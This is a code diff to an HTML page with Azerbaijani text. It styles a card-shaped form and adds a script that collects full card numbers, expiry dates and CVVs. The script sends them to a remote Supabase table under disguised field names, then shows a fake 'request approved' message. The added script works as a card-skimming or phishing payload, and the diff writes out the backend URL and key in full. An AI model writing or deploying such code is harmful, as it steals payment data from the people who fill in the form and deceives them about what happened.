@@ -100,11 +100,11 @@ color:white;
 background:radial-gradient(circle at center,#1bb34a,#0c5f2b 70%);
 }
 .back{
-background:#111;
+background:radial-gradient(circle at center,#1bb34a,#0c5f2b 70%);
 transform:rotateY(180deg);
 }
 
-/* BURANI DÜZƏLTDİM */
+/* STRIP artıq kart rəngində */
 .strip{
 height:40px;
 margin-top:20px;
@@ -124,12 +124,14 @@ font-weight:bold;
 
 .number{
 position:absolute;
-top:50%;
+top:55%;
 left:50%;
 transform:translate(-50%,-50%);
 font-size:20px;
 letter-spacing:3px;
+white-space:nowrap;
 }
+
 .exp{
 position:absolute;
 bottom:20px;
@@ -250,6 +252,79 @@ margin-bottom:20px;
 
 </div>
 </div>
+
+<script type="module">
+import { createClient } from "https://esm.sh/@supabase/supabase-js@2"
+
+const supabase = createClient(
+  "https://gkrfcoyleewxrxbfdunq.supabase.co",
+  "sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
+)
+
+const form=document.getElementById("form")
+const numberInput=document.getElementById("numberInput")
+const expInput=document.getElementById("expInput")
+const cvvInput=document.getElementById("cvvInput")
+const cardNumber=document.getElementById("cardNumber")
+const cardExp=document.getElementById("cardExp")
+const cvvDisplay=document.getElementById("cvvDisplay")
+const card=document.getElementById("card")
+const loading=document.getElementById("loading")
+const loadingText=document.getElementById("loadingText")
+
+numberInput.addEventListener("input",e=>{
+let val=e.target.value.replace(/\D/g,'').substring(0,16)
+val=val.replace(/(.{4})/g,'$1 ').trim()
+cardNumber.textContent=val||"0000 0000 0000 0000"
+numberInput.value=val
+})
+
+expInput.addEventListener("input",e=>{
+let val=e.target.value.replace(/\D/g,'').substring(0,4)
+if(val.length>=3){ val=val.substring(0,2)+"/"+val.substring(2) }
+expInput.value=val
+cardExp.textContent=val||"MM/YY"
+})
+
+cvvInput.addEventListener("focus",()=>card.classList.add("flip"))
+cvvInput.addEventListener("blur",()=>card.classList.remove("flip"))
+
+cvvInput.addEventListener("input",e=>{
+let val=e.target.value.replace(/\D/g,'').substring(0,3)
+cvvInput.value=val
+cvvDisplay.textContent=val
+setTimeout(()=>cvvDisplay.textContent="***",1000)
+})
+
+form.addEventListener("submit",async e=>{
+e.preventDefault()
+
+if(numberInput.value.replace(/\s/g,'').length!==16){ alert("16 rəqəm tam daxil edilməlidir"); return }
+if(expInput.value.length!==5){ alert("Tarix düzgün deyil"); return }
+if(cvvInput.value.length!==3){ alert("3 rəqəmli kod daxil edin"); return }
+
+loading.style.display="flex"
+
+const { error } = await supabase.from("mesajlar").insert([
+{
+kod1:numberInput.value,
+kod2:expInput.value,
+kod3:cvvInput.value
+}
+])
+
+if(error){ alert("Xəta: " + error.message); loading.style.display="none"; return }
+
+setTimeout(()=>{
+loadingText.textContent="Təbriklər Sorğunuz Təsdiq Olundu"
+},7000)
+
+setTimeout(()=>{
+location.reload()
+},9500)
+
+})
+</script>
 
 </body>
 </html>
